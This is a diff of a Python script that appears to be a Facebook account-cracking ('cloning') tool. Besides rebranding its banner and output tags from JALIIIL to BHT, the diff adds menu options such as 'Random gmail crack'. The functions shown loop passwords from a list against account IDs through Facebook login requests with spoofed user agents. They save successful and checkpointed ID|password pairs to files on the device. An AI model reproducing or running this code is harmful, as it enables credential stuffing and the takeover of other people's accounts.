@@ -44,18 +44,20 @@ for agent in range(10000):
         l='Mobile Safari/533.1'
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)
-logo=("""     ██╗ █████╗ ██╗     ██╗██╗██╗██╗     
+logo=("""
+\033[93;1m  ____        _    _   _______ ______          __  __ 
+\033[1;32m      ██╗ █████╗ ██╗     ██╗██╗██╗██╗     
      ██║██╔══██╗██║     ██║██║██║██║     
      ██║███████║██║     ██║██║██║██║     
 ██   ██║██╔══██║██║     ██║██║██║██║     
 ╚█████╔╝██║  ██║███████╗██║██║██║███████╗
- ╚════╝ ╚═╝  ╚═╝╚══════╝╚═╝╚═╝╚═╝╚══════╝ """) 
-\033[93;1m  ───────────────────────────────────────────────────────
+ ╚════╝ ╚═╝  ╚═╝╚══════╝╚═╝╚═╝╚═╝╚══════╝
+                                        
+\33[1;32m───────────────────────────────────────────────────────
 \033[1;95m[\033[1;93m[‌>]\033[1;95m]\033[1;93m TELEGRAM  \033[1;91m : \033[1;95mitzjalil0
 \033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m FACEBOOK\033[1;91m : \033[1;95mH. M. Jalil
 \033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m TOOLS   \033[1;91m : \033[1;95mJaliiil
-\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m VERSION \033[1;91m : \033[1;91m0.1\33[1;32m
-───────────────────────────────────────────────────────""")
+\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m VERSION \033[1;91m : \033[1;91m0.1\33[1;32m───────────────────────────────────────────────────────""")
 
 def linex():
         print('\033[1;37m----------------------------------------------')
@@ -207,7 +209,7 @@ def menu():
         #       chk()
                 x = ("sex")
                 if x == ("sex"):
-                        print(' [1] File cloning\n [0] Exit menu')
+                        print(' [1] File cloning\n [2] Create ids file\n [3] Public cloning\n [4] Random number cloning\n [5] Random gmail crack\n [6] WhatsApp Group (join)\n [7] Download Vpn\n [8] How To Use Video\n [0] Exit menu')
                         linex()
                         xd=input(' Choose an option: ')
                         if xd in ['1','01']:
@@ -224,7 +226,7 @@ def menu():
                                 clear()
                                 print(' All method working try 1 by 1 ')
                                 linex()
-                                print(' [1] Method 1 (for new ids) \n [2] Method 2 (for mix ids)(best)\n [3] Method 3 (for old ids)')
+                                print(' [1] Method 1 (for new ids) \n [2] Method 2 (for old ids)\n [3] Method 3 (for old ids)')
                                 linex()
                                 mthd=input(' Choose: ')
                                 linex()
@@ -434,7 +436,7 @@ def gmail():
                 os.system('python bht.py')
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m [JALIIIL-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [BHT-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -476,7 +478,7 @@ xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT
 def api(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [JALIIIL-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [BHT-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -526,14 +528,14 @@ def api(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [JALIIL-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/JALIIIL-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [BHT-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/BHT-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [JALIIIL-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/JALIIIL-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;208m [BHT-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/BHT-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
@@ -546,7 +548,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [JALIIIL-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [BHT-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -602,12 +604,12 @@ def api1(ids,names,passlist):
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [JALIIIL-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/JALIIIL-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;208m [BHT-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/BHT-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open('/sdcard/JALIIIL-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/BHT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -619,7 +621,7 @@ def api1(ids,names,passlist):
 def rndm(ids,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [JALIIIL-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [BHT-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         for pas in passlist:
                                 application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                 application_version_code=str(random.randint(000000000,999999999))
